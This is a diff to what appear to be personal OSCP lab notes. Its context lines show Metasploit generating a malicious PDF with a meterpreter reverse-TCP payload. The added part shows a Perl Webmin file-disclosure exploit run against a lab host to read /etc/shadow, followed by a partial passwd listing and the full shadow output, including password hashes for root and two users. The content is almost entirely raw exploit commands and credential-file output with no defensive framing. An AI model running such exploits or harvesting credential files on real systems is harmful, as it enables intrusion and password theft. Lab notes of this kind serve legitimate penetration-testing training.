@@ -783,3 +783,69 @@ msf5 exploit(windows/fileformat/adobe_pdf_embedded_exe) > exploit
 [*] Using 'windows/meterpreter/reverse_tcp' as payload...
 [+] Parsing Successful. Creating 'evil.pdf' file...
 [+] evil.pdf stored at /root/.msf4/local/evil.pdf
+
+# 10.11.1.133
+
+# 10.11.1.141
+
+:/var/spool/mqueue:/sbin/nologin
+rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
+nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin
+apache:x:48:48:Apache:/var/www:/sbin/nologin
+squid:x:23:23::/var/spool/squid:/sbin/nologin
+webalizer:x:67:67:Webalizer:/var/www/usage:/sbin/nologin
+xfs:x:43:43:X Font Server:/etc/X11/fs:/sbin/nologin
+ntp:x:38:38::/etc/ntp:/sbin/nologin
+mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash
+bob:x:500:500::/home/bob:/bin/bash
+alice:x:501:501::/home/alice:/bin/bash
+
+-------------------------------------
+root@ens:~/oscp/141# perl 2017.pl 10.11.1.141 10000 /etc/shadow 0
+WEBMIN EXPLOIT !!!!! coded by UmZ!
+Comments and Suggestions are welcome at umz32.dll [at] gmail.com
+Vulnerability disclose at securitydot.net
+I am just coding it in perl 'cuz I hate PHP!
+Attacking 10.11.1.141 on port 10000!
+FILENAME:  /etc/shadow
+
+ FILE CONTENT STARTED
+ -----------------------------------
+root:$1$236Vlq03$B7t0m/g9MRJmiR/ufF4jo0:16903:0:99999:7:::
+bin:*:13653:0:99999:7:::
+daemon:*:13653:0:99999:7:::
+adm:*:13653:0:99999:7:::
+lp:*:13653:0:99999:7:::
+sync:*:13653:0:99999:7:::
+shutdown:*:13653:0:99999:7:::
+halt:*:13653:0:99999:7:::
+mail:*:13653:0:99999:7:::
+news:*:13653:0:99999:7:::
+uucp:*:13653:0:99999:7:::
+operator:*:13653:0:99999:7:::
+games:*:13653:0:99999:7:::
+gopher:*:13653:0:99999:7:::
+ftp:*:13653:0:99999:7:::
+nobody:*:13653:0:99999:7:::
+dbus:!!:13653:0:99999:7:::
+vcsa:!!:13653:0:99999:7:::
+rpm:!!:13653:0:99999:7:::
+haldaemon:!!:13653:0:99999:7:::
+pcap:!!:13653:0:99999:7:::
+nscd:!!:13653:0:99999:7:::
+named:!!:13653:0:99999:7:::
+netdump:!!:13653:0:99999:7:::
+sshd:!!:13653:0:99999:7:::
+rpc:!!:13653:0:99999:7:::
+mailnull:!!:13653:0:99999:7:::
+smmsp:!!:13653:0:99999:7:::
+rpcuser:!!:13653:0:99999:7:::
+nfsnobody:!!:13653:0:99999:7:::
+apache:!!:13653:0:99999:7:::
+squid:!!:13653:0:99999:7:::
+webalizer:!!:13653:0:99999:7:::
+xfs:!!:13653:0:99999:7:::
+ntp:!!:13653:0:99999:7:::
+mysql:!!:13653:0:99999:7:::
+bob:$1$Rrhb4lzg$Ee8/JYZjv.NimwyrSEL6R/:16903:0:99999:7:::
+alice:$1$BfWG661G$ye24xqRQEx.nq.bZTATwf.:16917:0:99999:7:::
